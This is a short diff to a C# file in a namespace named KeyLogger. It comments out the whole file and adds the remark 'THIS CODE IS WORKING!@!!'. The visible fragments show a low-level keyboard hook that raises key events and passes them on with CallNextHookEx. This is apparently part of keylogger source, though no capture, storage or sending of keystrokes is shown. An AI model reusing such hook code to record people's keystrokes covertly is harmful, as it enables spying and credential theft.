@@ -1,4 +1,7 @@
-﻿using System;
+﻿
+//THIS CODE IS WORKING!@!!
+
+/*using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Reflection;
@@ -796,7 +799,7 @@ namespace KeyLogger
                     KeyEventArgs e = new KeyEventArgs(keyData);
                     KeyDown(this, e);
                     handled = handled || e.Handled;
-                }*/
+                }#1#
 
                 // raise KeyPress
                 if (KeyPress != null && wParam == WM_KEYDOWN) {
@@ -826,14 +829,14 @@ namespace KeyLogger
                     }
                 }
 
-                /*// raise KeyUp
+                /#1#/ raise KeyUp
                 if (KeyUp != null && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
                 {
                     Keys keyData = (Keys)MyKeyboardHookStruct.vkCode;
                     KeyEventArgs e = new KeyEventArgs(keyData);
                     KeyUp(this, e);
                     handled = handled || e.Handled;
-                }*/
+                }#1#
 
             }
 
@@ -844,4 +847,4 @@ namespace KeyLogger
                 return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
         }
     }
-}
+}*/
